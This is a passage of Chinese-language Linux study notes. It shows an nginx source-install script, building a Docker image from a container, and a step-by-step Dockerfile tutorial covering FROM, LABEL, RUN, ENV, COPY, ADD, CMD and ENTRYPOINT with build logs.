   awk -F'"' '/^VERSION_ID/{print $2}' /etc/os-release
}

check () {
    [ -e ${NGINX_INSTALL_DIR} ] && { color "nginx 已安装,请卸载后再安装" 1; exit; }
    cd  ${SRC_DIR}
    if [  -e ${NGINX_FILE}${TAR} ];then
        color "相关文件已准备好" 0
    else
        color '开始下载 nginx 源码包' 0
        rpm -q wget &> /dev/null || yum -y install wget &> /dev/null
        wget ${NGINX_URL}${NGINX_FILE}${TAR} 
        [ $? -ne 0 ] && { color "下载 ${NGINX_FILE}${TAR}文件失败" 1; exit; } 
    fi
} 

install () {
    color "开始安装 nginx" 0
    if id nginx  &> /dev/null;then
        color "nginx 用户已存在" 1 
    else
        useradd -s /sbin/nologin -r  nginx
        color "创建 nginx 用户" 0 
    fi
    color "开始安装 nginx 依赖包" 0
    if [ `os_type` == "CentOS" -a `os_version` == '8' ] ;then
        yum -y -q install make gcc-c++ libtool pcre pcre-devel zlib zlib-devel openssl openssl-devel perl-ExtUtils-Embed 
    elif [ `os_type` == "CentOS" -a `os_version` == '7' ];then
        yum -y -q  install make gcc pcre-devel openssl-devel zlib-devel perl-ExtUtils-Embed
    else
        apt update &> /dev/null
        apt -y install make gcc libpcre3 libpcre3-dev openssl libssl-dev zlib1g-dev &> /dev/null
    fi
    cd $SRC_DIR
    tar xf ${NGINX_FILE}${TAR}
    NGINX_DIR=`echo ${NGINX_FILE}${TAR}| sed -nr 's/^(.*[0-9]).*/\1/p'`
    cd ${NGINX_DIR}
    ./configure --prefix=${NGINX_INSTALL_DIR} --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module 
    make -j $CPUS && make install 
    [ $? -eq 0 ] && color "nginx 编译安装成功" 0 ||  { color "nginx 编译安装失败,退出!" 1 ;exit; }
    echo "PATH=${NGINX_INSTALL_DIR}/sbin:${PATH}" > /etc/profile.d/nginx.sh
    cat > /lib/systemd/system/nginx.service <<EOF
[Unit]
Description=The nginx HTTP and reverse proxy server
After=network.target remote-fs.target nss-lookup.target

[Service]
Type=forking
PIDFile=${NGINX_INSTALL_DIR}/logs/nginx.pid
ExecStartPre=/bin/rm -f ${NGINX_INSTALL_DIR}/logs/nginx.pid
ExecStartPre=${NGINX_INSTALL_DIR}/sbin/nginx -t
ExecStart=${NGINX_INSTALL_DIR}/sbin/nginx
ExecReload=/bin/kill -s HUP \$MAINPID
KillSignal=SIGQUIT
TimeoutStopSec=5
KillMode=process
PrivateTmp=true

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    ln -s /apps/nginx/sbin/nginx /usr/sbin/
    systemctl enable --now nginx &> /dev/null 
    systemctl is-active nginx &> /dev/null ||  { color "nginx 启动失败,退出!" 1 ; exit; }
    color "nginx 安装完成" 0
}

check
install


#改为前台执行
[root@90ae6f81a816 ~]# bash install_nginx.sh
[root@90ae6f81a816 ~]# vim /apps/nginx/conf/nginx.conf
#user  nobody;
worker_processes  1;
daemon off;   #前台执行



#编写测试页面
[root@90ae6f81a816 ~]# echo "Nginx Test Page in Docker" > /apps/nginx/html/index.html
[root@90ae6f81a816 ~]# hostname -i
172.17.0.3
[root@90ae6f81a816 ~]# nginx



#测试访问nginx页面
[root@centos7 ~]# curl 172.17.0.3
Nginx Test Page in Docker



#查看CONTAINER ID
[root@centos7 ~]# docker ps -a
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                      PORTS               NAMES
90ae6f81a816        centos              "bash"              25 minutes ago      Exited (0) 11 seconds ago                       heuristic_williamson
07baaff4867f        centos              "bash"              2 hours ago         Exited (0) 26 minutes ago                       recursing_hofstadter
a8c606e9d172        centos              "bash"              3 hours ago         Up 3 hours                                      confident_gates



#将定制的nginx制作成镜像
[root@centos7 ~]# docker commit -m "nginx1.8.0" -c "CMD nginx" 90ae6f81a816 nginx-centos8:v1.0-1.18.0
sha256:d44c06e306b52f73d8b9206b066a34b5baa7d5107397e853fda26124c194645a




#查看新镜像
[root@centos7 ~]# docker images
REPOSITORY              TAG                 IMAGE ID            CREATED             SIZE
nginx-centos8           v1.0-1.18.0         d44c06e306b5        19 seconds ago      613MB
liu/centos7-nginx       1.14.1.v1           f239712db2b3        3 hours ago         344MB
nginx_ubuntu20.04       v1.18.0             d2e39df63826        4 hours ago         196MB
tomcat                  10.0.14-v1          e3e29ddcc7c3        5 hours ago         684MB
httpd-busybox           v2.0                ff1c4d6b6b36        5 hours ago         1.24MB
httpd-busybox           v1.0                9598c568888c        6 hours ago         1.24MB
busybox                 latest              beae173ccac6        7 months ago        1.24MB
nginx                   latest              605c77e624dd        7 months ago        141MB
tomcat                  latest              fb5657adc892        7 months ago        680MB
redis                   latest              7614ae9453d1        7 months ago        113MB
httpd                   latest              dabbfbe0c57b        7 months ago        144MB
alpine                  latest              c059bfaa849c        8 months ago        5.59MB
ubuntu                  latest              ba6acccedd29        9 months ago        72.8MB
centos                  latest              5d0da3dc9764        10 months ago       231MB
mysql                   5.7.32              cc8775c0fe94        18 months ago       449MB
docs/docker.github.io   latest              32ed84d97e30        2 years ago         1GB



#从自己的镜像启动容器
[root@centos7 ~]# docker run -d -p 90:80 --name web02 nginx-centos8:v1.0-1.18.0
ff492e16200dc3c3613764d29622956ce81bfa19af3d3917535dbc878e63406b
[root@centos7 ~]# docker ps
CONTAINER ID        IMAGE                       COMMAND              CREATED             STATUS              PORTS               NAMES
ff492e16200d        nginx-centos8:v1.0-1.18.0   "/bin/sh -c nginx"   20 seconds ago      Up 19 seconds       0.0.0.0:90->80/tcp   web02
a8c606e9d172        centos                      "bash"               3 hours ago         Up 3 hours                              confident_gates
[root@centos7 ~]# docker port web02
80/tcp -> 0.0.0.0:90
```

![1659630025879](linux体系.assets/1659630025879.png)



#### 48.6.3 DockerFile自动构建镜像(重点)

##### 48.6.3.1  Dockfile相关介绍

**Dockerfile介绍**

```
DockerFile 是一种被Docker程序解释执行的脚本，由一条条的命令组成的，每条命令对应linux下面的一条命令，Docker程序将这些DockerFile指令再翻译成真正的linux命令，其有自己的书写方式和支持的命令，Docker程序读取DockerFile并根据指令生成Docker镜像，相比手动制作镜像的方式，DockerFile更能直观的展示镜像是怎么产生的，有了DockerFile，当后期有额外的需求时，只要在之前的DockerFile添加或者修改响应的命令即可重新生成新的Docker镜像，避免了重复手动制作镜像的麻烦,类似与shell脚本一样,可以方便高效的制作镜像。

Docker守护程序 Dockerfile 逐一运行指令，如有必要，将每个指令的结果提交到新镜像，然后最终输出新镜像的ID。Docker守护程序将自动清理之前发送的上下文。
	
请注意，每条指令都是独立运行的，并会导致创建新镜像，比如 RUN cd /tmp 对下一条指令不会有任何影响。
Docker将尽可能重用中间镜像层（缓存），以显著加速 docker build 命令的执行过程，这由 Using cache 控制台输出中的消息指示。
```

**Dockerfile镜像制作和使用流程**

![1659692908800](linux体系.assets/1659692908800.png)

**Dockerfile文件的制作镜像的分层结构**

![1659692982329](linux体系.assets/1659692982329.png)

**示例**

```
[root@centos7 ~]# mkdir /data/dockerfile/{web/{nginx,apache,tomcat,jdk},system/{centos,ubuntu,alpine,debian}} -p
[root@centos7 ~]# tree /data/dockerfile/
/data/dockerfile/
├── system
│   ├── alpine
│   ├── centos
│   ├── debian
│   └── ubuntu
└── web
    ├── apache
    ├── jdk
    ├── nginx
    └── tomcat

10 directories, 0 files
```

##### 48.6.3.2 Dockerfile文件格式

```
Dockerfile 是一个有特定语法格式的文本文件
dockerfile 官方说明: https://docs.docker.com/engine/reference/builder/
帮助: man 5 dockerfile 

Dockerfile文件说明
1）每一行以Dockerfile的指令开头，指令不区分大小写，但是惯例使用大写。
2）使用 # 开始作为注释。
3）每一行只支持一条指令，每条指令可以携带多个参数。
4）指令按文件的顺序从上至下进行执行。
5）每个指令的执行会生成一个新的镜像层，为了减少分层和镜像大小，尽可能将多条指令合并成一条指令。
6）制作镜像一般可能需要反复多次，每次执行dockfile都按顺序执行，从头开始，已经执行过的指令已经缓存，不需要再执行，如果后续有一行新的指令没执行过，其往后的指令将会重新执行，所以为加速镜像制作，将最常变化的内容放下dockerfile的文件的后面。
```

##### 48.6.3.3 Dockerfile相关指令

```
ADD
COPY
ENV
EXPOSE
FROM
LABEL
STOPSIGNAL
USER
VOLUME
WORKDIR
```

###### 48.6.3.3.1 FROM: 指定基础镜像

```
定制镜像，需要先有一个基础镜像，在这个基础镜像上进行定制。
FROM 就是指定基础镜像，此指令通常必需放在Dockerfile文件第一个非注释行。后续的指令都是运行于此基准镜像所提供的运行环境。
基础镜像可以是任何可用镜像文件，默认情况下，docker build会在docker主机上查找指定的镜像文件，在其不存在时，则会从Docker Hub Registry上拉取所需的镜像文件.如果找不到指定的镜像文件，docker build会返回一个错误信息。

如何选择合适的镜像呢？
对于不同的软件官方都提供了相关的docker镜像，比如: nginx、redis、mysql、httpd、tomcat等服务类的镜像，也有操作系统类，如: centos、ubuntu、debian等。建议使用官方镜像，比较安全。

格式:
FROM [--platform=<platform>] <image> [AS <name>]
FROM [--platform=<platform>] <image>[:<tag>] [AS <name>]
FROM [--platform=<platform>] <image>[@<digest>] [AS <name>]


#说明:  
--platform 指定镜像的平台，比如: linux/amd64, linux/arm64, or windows/amd64
tag 和 digest是可选项，如果不指定，默认为latest


#范例:编写Dockerfile文件
[root@centos7 ~]# cd /data/dockerfile/system/centos/
[root@centos7 centos]# mkdir centos{7,8}
[root@centos7 centos]# cd centos7/
[root@centos7 centos7]# vim Dockerfile
FROM centos:7.9.2009     #修改此处！
```

**说明: 关于scratch 镜像**

```
FROM scratch
参考链接:
https://hub.docker.com/_/scratch?tab=description
https://docs.docker.com/develop/develop-images/baseimages/

该镜像是一个空的镜像，可以用于构建busybox等超小镜像，可以说是真正的从零开始构建属于自己的镜像该镜像在构建基础镜像（例如debian和busybox）或超最小镜像（仅包含一个二进制文件及其所需内容，例如:hello-world）的上下文中最有用。
简而言之一句话：祖宗镜像，所有镜像的起源！！



范例:
FROM scratch #所有镜像的起源镜像，相当于Object类
FROM ubuntu
FROM ubuntu:bionic
FROM debian:buster-slim
```

###### 48.6.3.3.2 LABEL: 指定镜像元数据

```
可以指定镜像元数据，如: 镜像作者等
LABEL <key>=<value> <key>=<value> <key>=<value> ...



范例:
LABEL "com.example.vendor"="ACME Incorporated"
LABEL com.example.label-with-value="foo"
LABEL version="1.0"
LABEL description="This text illustrates \  #换行用\隔开
that label-values can span multiple lines."



#范例: 多标签写法
#一行格式
LABEL multi.label1="value1" multi.label2="value2" other="value3"

#多行格式
LABEL multi.label1="value1" \
     multi.label2="value2" \
      other="value3"
      


#范例:docker inspect命令可以查看LABEL
"Labels": {
    "com.example.vendor": "ACME Incorporated"
    "com.example.label-with-value": "foo",
    "version": "1.0",
    "description": "This text illustrates that label-values can span multiple lines.",
    "multi.label1": "value1",
    "multi.label2": "value2",
    "other": "value3"
},




#范例:继续编写Dockerfile文件
[root@centos7 centos7]# vim Dockerfile
FROM centos:7.9.2009
LABEL author="liusenbiao <root@liusenbiao.com>" \     #修改此处！
      version="0.1"  \
      description="test baseimage"
```

###### 48.6.3.3.3 RUN: 执行 shell命令

```
#1.概述
RUN 指令用来在构建镜像阶段需要执行 FROM 指定镜像所支持的Shell命令。
通常各种基础镜像一般都支持丰富的shell命令。
注意: RUN 可以写多个，每一个RUN指令都会建立一个镜像层，所以尽可能合并成一条指令,比如将多个shell命令通过 && 连接一起成为在一条指令。
每个RUN都是独立运行的,和前一个RUN无关。

#shell 格式: 相当于 /bin/sh -c <命令> 此种形式支持环境变量
RUN <命令> 

#exec 格式: 此种形式不支持环境变量,注意:是双引号,不能是单引号
RUN ["可执行文件", "参数1", "参数2"]

#exec格式可以指定其它shell
RUN ["/bin/bash","-c","echo hello liu"]




#2.说明：
shell格式中，<command>通常是一个shell命令，且以"/bin/sh -c”来运行它，这意味着此进程在容器中的PID不为1，不能接收Unix信号，因此，当使用docker stop <container>命令停止容器时，此进程接收不到SIGTERM信号。

exec格式中的参数是一个JSON格式的数组，其中<executable>为要运行的命令，后面的<paramN>为传递给命令的选项或参数;然而，此种格式指定的命令不会以"/bin/sh -c"来发起，因此常见的shell操作如变量替换以及通配符(?,*等)替换将不会进行;不过，如果要运行的命令依赖于此shell特性的话，可以将其替换为类似下面的格式。
RUN ["/bin/bash", "-c", "<executable>", "<param1>"]




#3.范例:继续编写Dockerfile文件
[root@centos7 centos7]# vim Dockerfile
FROM centos:7.9.2009
LABEL author="liusenbiao <root@liusenbiao.com>" \
      version="0.1"  \
      description="test baseimage"
RUN rm -rf /etc/yum.repos.d/*      #修改此处！
```

###### 48.6.3.3.4 ENV: 设置环境变量

```
ENV可以定义环境变量和值，会被后续指令(如:ENV,ADD,COPY,RUN等)通过$KEY或${KEY}进行引用，并在容器运行时保持。

#变量赋值格式1
ENV <key> <value>   #此格式只能对一个key赋值,<key>之后的所有内容均会被视作其<value>的组成部分

#变量赋值格式2
ENV <key1>=<value1> <key2>=<value2> \  #此格式可以支持多个key赋值,定义多个变量建议使用,减少镜像层
 <key3>=<value3> ...
 
#如果<value>中包含空格，可以以反斜线\进行转义，也可通过对<value>加引号进行标识;另外，反斜线也可用于续行
#只使用一次变量。

RUN <key>=<value> <command>
    
#引用变量
RUN $key .....

#变量支持高级赋值格式
${key:-word}
${kye:+word}





#范例
#创建构建镜像脚本
[root@centos7 centos7]# cat build.sh 
#!/bin/bash
docker build -t $1 .
[root@centos7 centos7]# chmod +x build.sh





#继续编写Dockerfile文件
[root@centos7 centos7]# vim Dockerfile
FROM centos:7.9.2009
LABEL author="liusenbiao <root@liusenbiao.com>" \
      version="0.1"  \
      description="test baseimage"
RUN rm -rf /etc/yum.repos.d/*
RUN mkdir /app
ENV VERSION="1.0" USER=mysql   #修改此处！
RUN touch /app/${VERSION}.log





#自动构建镜像
[root@centos7 centos7]# ./build.sh centos7.9:v1.0
Sending build context to Docker daemon  3.072kB
Step 1/6 : FROM centos:7.9.2009
 ---> eeb6ee3f44bd
Step 2/6 : LABEL author="liusenbiao <root@liusenbiao.com>"       version="0.1"        description="test baseimage"
 ---> Using cache
 ---> 0b1ae7f8bc28
Step 3/6 : RUN rm -rf /etc/yum.repos.d/*
 ---> Using cache
 ---> 3d17314ab70a
Step 4/6 : RUN mkdir /app
 ---> Running in 1ad4d4348460
Removing intermediate container 1ad4d4348460
 ---> 222deeabe914
Step 5/6 : ENV VERSION="1.0" USER=mysql
 ---> Running in 8f5c7d64ddc7
Removing intermediate container 8f5c7d64ddc7
 ---> a74c32eb0b8a
Step 6/6 : RUN touch /app/${VERSION}.log
 ---> Running in 8253b6a420ae
Removing intermediate container 8253b6a420ae
 ---> 6af9c6d53ba3
Successfully built 6af9c6d53ba3
Successfully tagged centos7.9:v2.0





#查看镜像
[root@centos7 centos7]# docker images
REPOSITORY              TAG                 IMAGE ID            CREATED             SIZE
centos7.9               v1.0                6af9c6d53ba3        33 seconds ago      204MB
<none>                  <none>              698e87170ced        2 minutes ago       204MB
nginx-centos8           v1.0-1.18.0         d44c06e306b5        16 hours ago        613MB
liu/centos7-nginx       1.14.1.v1           f239712db2b3        19 hours ago        344MB
nginx_ubuntu20.04       v1.18.0             d2e39df63826        20 hours ago        196MB
tomcat                  10.0.14-v1          e3e29ddcc7c3        21 hours ago        684MB
httpd-busybox           v2.0                ff1c4d6b6b36        22 hours ago        1.24MB
httpd-busybox           v1.0                9598c568888c        22 hours ago        1.24MB
busybox                 latest              beae173ccac6        7 months ago        1.24MB
nginx                   latest              605c77e624dd        7 months ago        141MB
tomcat                  latest              fb5657adc892        7 months ago        680MB
redis                   latest              7614ae9453d1        7 months ago        113MB
httpd                   latest              dabbfbe0c57b        7 months ago        144MB
alpine                  latest              c059bfaa849c        8 months ago        5.59MB
ubuntu                  latest              ba6acccedd29        9 months ago        72.8MB
centos                  7.9.2009            eeb6ee3f44bd        10 months ago       204MB
centos                  latest              5d0da3dc9764        10 months ago       231MB
mysql                   5.7.32              cc8775c0fe94        19 months ago       449MB
docs/docker.github.io   latest              32ed84d97e30        2 years ago         1GB





#查看变量引用起作用了没
[root@centos7 centos7]# docker run -it --rm centos7.9:v1.0
[root@7482e5197d8c /]# ls /app/
1.0.log      #变量引用成功！！




#临时修改ENV变量
[root@centos7 centos7]# docker run -it -e USER=liu -e VERSION=2.0 --rm  centos7.9:v1.0
[root@47429a587f8f /]# set
....
MACHTYPE=x86_64-redhat-linux-gnu
MAILCHECK=60
OPTERR=1
OPTIND=1
OSTYPE=linux-gnu
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PIPESTATUS=([0]="0")
PPID=0
PROMPT_COMMAND='printf "\033]0;%s@%s:%s\007" "${USER}" "${HOSTNAME%%.*}" "${PWD/#$HOME/~}"'
PS1='[\u@\h \W]\$ '
PS2='> '
PS4='+ '
PWD=/
SHELL=/bin/bash
SHELLOPTS=braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitor
SHLVL=1
TERM=xterm
UID=0
USER=liu       #修改成功
VERSION=2.0    #修改成功
_=/etc/bashrc
colors=/root/.dircolors
....




#把变量写到文件里
-e的优先级最高！！！
[root@centos7 centos7]# vim /data/env.text
USER=liusenbiao
VERSION=3.0
[root@centos7 centos7]# docker run -it --env-file /data/env.text --rm  centos7.9:v1.0
[root@ed4f02a04c9c /]# set
...
PS1='[\u@\h \W]\$ '
PS2='> '
PS4='+ '
PWD=/
SHELL=/bin/bash
SHELLOPTS=braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitor
SHLVL=1
TERM=xterm
UID=0
USER=liusenbiao    #修改成功
VERSION=3.0        #修改成功
...
```

###### 48.6.3.3.5 COPY: 复制文本

```
#概述
复制本地宿主机的<src>到容器中的<dest>。
COPY [--chown=<user>:<group>] <src>... <dest>
COPY [--chown=<user>:<group>] ["<src>",... "<dest>"] #路径中有空白字符时,建议使用此格式



#说明
1）<src>可以是多个,可以使用通配符，通配符规则满足Go的filepath.Match 规则filepath.Match 
   参考链接:https://golang.org/pkg/path/filepath/#Match
2）<src>必须是build上下文中的路径(为 Dockerfile 所在目录的相对路径），不能是其父目录中的文件。
3）如果<src>是目录，则其内部文件或子目录会被递归复制，但<src>目录自身不会被复制。
4）如果指定了多个<src>, 或在<src>中使用了通配符，则<dest>必须是一个目录，且必须以/结尾。
5）<dest>可以是绝对路径或者是WORKDIR指定的相对路径。
6）<dest>使用COPY指令，源文件的各种元数据都会保留。比如读、写、执行权限、文件变更时间等。
7）如果<dest>事先不存在，它将会被自动创建，这包括其父目录路径,即递归创建目录。



#案例：
[root@centos7 ~]# cd /data/dockerfile/system/centos/centos7/
[root@centos7 centos7]# cp /etc/yum.repos.d/base.repo /data/dockerfile/system/centos/centos7/
[root@centos7 centos7]# cat base.repo 
[base]
name=CentOS
baseurl= https://mirrors.aliyun.com/centos/$releasever/os/$basearch/
         https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/os/$basearch/
         https://mirrors.huaweicloud.com/centos/$releasever/os/x86_64/os/
         https://mirrors.cloud.tencent.com/centos/$releasever/os/$basearch/
gpgcheck=0

[extras]
name=extras
baseurl=https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/extras/$basearch
        https://mirrors.huaweicloud.com/centos/$releasever/extras/$basearch
        https://mirrors.cloud.tencent.com/centos/$releasever/extras/$basearch
          https://mirrors.aliyun.com/centos/$releasever/extras/$basearch
gpgcheck=0
enabled=1

[epel]
name=epel
baseurl=http://mirrors.cloud.tencent.com/epel/$releasever/$basearch
        http://mirrors.huaweicloud.com/epel/$releasever/$basearch
enabled=1
gpgcheck=1
gpgkey=http://mirrors.huaweicloud.com/epel/RPM-GPG-KEY-EPEL-7



#使用COPY
[root@centos7 centos7]# vim Dockerfile 
FROM centos:7.9.2009
LABEL author="liusenbiao <root@liusenbiao.com>" \
      version="0.1"  \
      description="test baseimage"
RUN rm -rf /etc/yum.repos.d/*
COPY base.repo /etc/yum.repos.d/    #修改此处！
COPY *.txt /data/testdir/   #修改此处！拷贝多个源，且必须以/结尾。
RUN mkdir /app
ENV VERSION="1.0" USER=mysql
RUN touch /app/${VERSION}.log



#构建镜像
[root@centos7 centos7]# ./build.sh centos7.9:v2.0
Sending build context to Docker daemon  4.608kB
Step 1/7 : FROM centos:7.9.2009
 ---> eeb6ee3f44bd
Step 2/7 : LABEL author="liusenbiao <root@liusenbiao.com>"       version="0.1"        description="test baseimage"
 ---> Using cache
 ---> f7e86ff3af03
Step 3/7 : RUN rm -rf /etc/yum.repos.d/*
 ---> Using cache
 ---> 6602e7afd878
Step 4/7 : COPY base.repo /etc/yum.repos.d/
 ---> 55498414702b
Step 5/7 : RUN mkdir /app
 ---> Running in baa88f48c5ef
Removing intermediate container baa88f48c5ef
 ---> a117ff39bea9
Step 6/7 : ENV VERSION="1.0" USER=mysql
 ---> Running in 8c70af8f9d92
Removing intermediate container 8c70af8f9d92
 ---> 4ba81678682c
Step 7/7 : RUN touch /app/${VERSION}.log
 ---> Running in 9cb531325f62
Removing intermediate container 9cb531325f62
 ---> 846aad1c1aec
Successfully built 846aad1c1aec
Successfully tagged centos7.9:v2.0



#查看镜像
[root@centos7 centos7]# docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
centos7.9           v2.0                846aad1c1aec        51 seconds ago      204MB
centos7.9           v1.0                ceb97c3c6095        10 hours ago        204MB
centos              7.9.2009            eeb6ee3f44bd        10 months ago       204MB



#运行容器
[root@centos7 centos7]# docker run -it --rm centos7.9:v2.0
[root@3b62e7efb15c /]# cat /etc/yum.repos.d/base.repo 
[base]
name=CentOS
baseurl= https://mirrors.aliyun.com/centos/$releasever/os/$basearch/
         https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/os/$basearch/
         https://mirrors.huaweicloud.com/centos/$releasever/os/x86_64/os/
         https://mirrors.cloud.tencent.com/centos/$releasever/os/$basearch/
gpgcheck=0

[extras]
name=extras
baseurl=https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/extras/$basearch
        https://mirrors.huaweicloud.com/centos/$releasever/extras/$basearch
        https://mirrors.cloud.tencent.com/centos/$releasever/extras/$basearch
          https://mirrors.aliyun.com/centos/$releasever/extras/$basearch
gpgcheck=0
enabled=1

[epel]
name=epel
baseurl=http://mirrors.cloud.tencent.com/epel/$releasever/$basearch
        http://mirrors.huaweicloud.com/epel/$releasever/$basearch
enabled=1
gpgcheck=1
gpgkey=http://mirrors.huaweicloud.com/epel/RPM-GPG-KEY-EPEL-7
```

###### 48.6.3.3.6 ADD: 复制和解包文件

```
#概述
该命令可认为是增强版的COPY，不仅支持COPY，还支持自动解缩。可以将复制指定的<src>到容器中的<dest>
[--chown=<user>:<group>] <src>... <dest>
ADD [--chown=<user>:<group>] ["<src>",... "<dest>"]



#说明
1）<src>可以是Dockerfile所在目录的一个相对路径；也可是一个 URL；还可是一个tar文件（自动解压）。
2）<dest>可以是绝对路径或者是 WORKDIR 指定的相对路径。
3）如果<src>是目录，只复制目录中的内容，而非目录本身。
4）如果<src>是一个URL ，下载后的文件权限自动设置为600。
5）如果<src>为URL且<dest>不以/结尾，则<src>指定的文件将被下载并直接被创建为<dest>,如果<dest>以/结尾，则文件名URL指定的文件将被直接下载并保存为<dest>/< filename>。
6）如果<src>是一个本地文件系统上的打包文件,如:gz, bz2 ,xz,它将被解包 ，其行为类似于"tar -x"命令,但是通过URL获取到的tar文件将不会自动展开,但是.zip后缀的解压缩不了。
7）如果<src>有多个，或其间接或直接使用了通配符，则<dest>必须是一个以/结尾的目录路径;如果<dest>不以/结尾，则其被视作一个普通文件，<src>的内容将被直接写入到<dest>。

ADD test relativeDir/          # adds "test" to `WORKDIR`/relativeDir/
ADD test /absoluteDir/         # adds "test" to /absoluteDir/
ADD --chown=55:mygroup files* /somedir/
ADD --chown=bin files* /somedir/
ADD --chown=1 files* /somedir/
ADD --chown=10:11 files* /somedir/
ADD ubuntu-xenial-core-cloudimg-amd64-root.tar.gz /




#案例
[root@centos7 centos7]# touch a.txt b.txt
[root@centos7 centos7]# tar zcvf a.tgz *.txt



#编写Dockerfile文件
[root@centos7 centos7]# vim Dockerfile 
FROM centos:7.9.2009
LABEL author="liusenbiao <root@liusenbiao.com>" \
      version="0.1"  \
      description="test baseimage"
RUN rm -rf /etc/yum.repos.d/*
COPY base.repo /etc/yum.repos.d/
RUN yum -y install wget vim gcc bzip2 tree unzip
ADD a.tgz /data/testdir/     #修改此处！
RUN mkdir /app
ENV VERSION="1.0" USER=mysql
RUN touch /app/${VERSION}.log



#构建镜像
[root@centos7 centos7]# ./build.sh centos7.9:v3.0
...
Step 8/9 : ENV VERSION="1.0" USER=mysql
 ---> Running in cf0aa8ac556c
Removing intermediate container cf0aa8ac556c
 ---> 3506318eecd4
Step 9/9 : RUN touch /app/${VERSION}.log
 ---> Running in a18b0dbf90e6
Removing intermediate container a18b0dbf90e6
 ---> e7326cf61b00
Successfully built e7326cf61b00
Successfully tagged centos7.9:v3.0
...



#查看ADD命令是否解压缩成功
[root@centos7 centos7]# docker run -it --rm centos7.9:v3.0
[root@17e93ea0c696 /]# ls /data/testdir/
a.txt  b.txt     #自动解压缩成功！！！！
```

###### 48.6.3.3.7 CMD: 容器启动命令

![1659757272713](linux体系.assets/1659757272713.png)

```
#概述
一个容器中需要持续运行的进程一般只有一个,CMD 用来指定启动容器时默认执行的一个命令，且其运行结束后,容器也会停止,所以一般CMD 指定的命令为持续运行且为前台命令.

1）如果docker run没有指定任何的执行命令或者dockerfile里面也没有ENTRYPOINT，那么开启容器时就会使用执行CMD指定的默认的命令。
2）前面介绍过的 RUN 命令是在构建镜像进执行的命令,注意二者的不同之处。
3）每个 Dockerfile 只能有一条 CMD 命令。如指定了多条，只有最后一条被执行。
4）如果用户启动容器时用 docker run xxx 指定运行的命令，则会覆盖CMD指定的命令。


#使用 exec 执行，推荐方式，第一个参数必须是命令的全路径,此种形式不支持环境变量
CMD ["executable","param1","param2"] 

# 在 /bin/sh 中执行，提供给需要交互的应用；此种形式支持环境变量
CMD command param1 param2 

# 提供给 ENTRYPOINT 命令的默认参数
CMD ["param1","param2"]




#案例
#编写Dockerfile文件1
[root@centos7 centos7]# vim Dockerfile
FROM centos:7.9.2009
LABEL author="liusenbiao <root@liusenbiao.com>" \
      version="0.1"  \
      description="test baseimage"
RUN rm -rf /etc/yum.repos.d/*
COPY base.repo /etc/yum.repos.d/
RUN yum -y install wget vim gcc bzip2 tree
ADD a.tgz /data/testdir/
RUN mkdir /app
ENV VERSION="1.0" USER=mysql
RUN touch /app/${VERSION}.log
CMD tail -f /etc/hosts     #修改此处！使容器持续运行





#编写Dockerfile文件2
[root@centos7 centos7]# vim Dockerfile
FROM centos:7.9.2009
LABEL author="liusenbiao <root@liusenbiao.com>" \
      version="0.1"  \
      description="test baseimage"
RUN rm -rf /etc/yum.repos.d/*
COPY base.repo /etc/yum.repos.d/
RUN yum -y install wget vim gcc bzip2 tree nginx
ADD a.tgz /data/testdir/
RUN mkdir /app
ENV VERSION="1.0" USER=mysql
RUN touch /app/${VERSION}.log
CMD ["nginx", "-g", "daemon off;"]     #修改此处！使容器持续运行



#构建镜像
[root@centos7 centos7]# ./build.sh centos7.9:v4.0
Sending build context to Docker daemon  6.656kB
Step 1/10 : FROM centos:7.9.2009
 ---> eeb6ee3f44bd
Step 2/10 : LABEL author="liusenbiao <root@liusenbiao.com>"       version="0.1"        description="test baseimage"
 ---> Using cache
 ---> f7e86ff3af03
Step 3/10 : RUN rm -rf /etc/yum.repos.d/*
 ---> Using cache
 ---> 6602e7afd878
Step 4/10 : COPY base.repo /etc/yum.repos.d/
 ---> Using cache
 ---> 55498414702b
Step 5/10 : RUN yum -y install wget vim gcc bzip2 tree
 ---> Using cache
 ---> 65bacc1cd992
Step 6/10 : ADD a.tgz /data/testdir/
 ---> Using cache
 ---> 41c4889bb42b
Step 7/10 : RUN mkdir /app
 ---> Using cache
 ---> cb38bd7d3ce5
Step 8/10 : ENV VERSION="1.0" USER=mysql
 ---> Using cache
 ---> 3506318eecd4
Step 9/10 : RUN touch /app/${VERSION}.log
 ---> Using cache
 ---> e7326cf61b00
Step 10/10 : CMD tail -f /etc/hosts
 ---> Running in 9f60e8a6247e
Removing intermediate container 9f60e8a6247e
 ---> 62630f554b7c
Successfully built 62630f554b7c
Successfully tagged centos7.9:v4.0



[root@centos7 centos7]# docker images
REPOSITORY          TAG                 IMAGE ID            CREATED              SIZE
centos7.9           v4.0                62630f554b7c        About a minute ago   411MB
centos7.9           v3.0                e7326cf61b00        48 minutes ago       411MB
centos7.9           v2.0                846aad1c1aec        2 hours ago          204MB
centos7.9           v1.0                ceb97c3c6095        11 hours ago         204MB
centos              7.9.2009            eeb6ee3f44bd        10 months ago        204MB



[root@centos7 centos7]# docker run -d centos7.9:v4.0
ba8508bf6cc40af899c58c6589f2816df5338a650c9be2ec3fc52cb4f65cfeb0



#容器可以持续运行了！！
[root@centos7 centos7]# docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS               NAMES
ba8508bf6cc4        centos7.9:v4.0      "/bin/sh -c 'tail -f…"   9 seconds ago       Up 8 seconds                            reverent_williamson
```

###### 48.6.3.3.8 ENTRYPOINT: 入口点

```
#概述
功能类似于CMD，配置容器启动后执行的命令及参数

# 使用 exec 执行
ENTRYPOINT ["executable", "param1", "param2"]

# shell中执行
ENTRYPOINT command param1 param2




#说明
1）ENTRYPOINT不能被 docker run提供的参数覆盖，而是追加,即如果docker run 命令有参数，那么参数全部都会作为ENTRYPOINT的参数。
